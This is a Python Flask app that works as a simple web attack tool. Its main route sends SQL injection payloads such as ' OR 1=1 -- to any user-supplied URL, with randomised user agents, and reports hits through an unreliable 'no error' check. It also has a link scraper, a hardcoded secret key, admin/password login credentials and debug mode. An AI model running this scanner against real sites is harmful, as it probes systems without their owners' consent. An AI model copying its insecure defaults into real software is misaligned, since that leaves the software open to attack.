import requests
import json
from bs4 import BeautifulSoup
from random_user_agent.user_agent import UserAgent
from random_user_agent.params import SoftwareName, OperatingSystem
from flask import Flask, render_template, request, abort, session
from flask_session import Session
from flask_wtf import FlaskForm
from wtforms import StringField, SubmitField
from wtforms.validators import DataRequired, URL

app = Flask(__name__)
app.config['SECRET_KEY'] = 'mysecretkey'
app.config['SESSION_TYPE'] = 'filesystem'
app.config['SESSION_PERMANENT'] = False
app.config['SESSION_COOKIE_SECURE'] = True
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'
Session(app)

class WebsiteForm(FlaskForm):
    website = StringField('Website', validators=[DataRequired(), URL()])
    submit = SubmitField('Submit')

@app.route('/', methods=['GET', 'POST'])
def index():
    form = WebsiteForm()
    if form.validate_on_submit():
        website = form.website.data
        payloads = ["' OR 1=1 --", "1' OR '1'='1", "admin'--"]
        headers = {'User-Agent': UserAgent().get_random_user_agent()}
        results = []
        for payload in payloads:
            r = requests.get(website + "?username=" + payload + "&password=test", headers=headers)
            if "error" not in r.text.lower():
                results.append("SQL injection vulnerability found with payload: " + payload)
        return render_template('index.html', form=form, results=results)
    return render_template('index.html', form=form)

@app.route('/scrape', methods=['POST'])
def scrape():
    if 'logged_in' in session and session['logged_in']:
        website = request.form['website']
        headers = {'User-Agent': UserAgent().get_random_user_agent()}
        r = requests.get(website, headers=headers)
        soup = BeautifulSoup(r.text, 'html.parser')
        links = []
        for link in soup.find_all('a'):
            links.append(link.get('href'))
        return render_template('scrape.html', links=links)
    else:
        abort(403)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if username == 'admin' and password == 'password':
            session['logged_in'] = True
            return render_template('login.html', success=True)
        else:
            return render_template('login.html', error=True)
    return render_template('login.html')

@app.route('/logout', methods=['GET'])
def logout():
    session.pop('logged_in', None)
    return render_template('logout.html')

if __name__ == '__main__':
    app.run(debug=True)


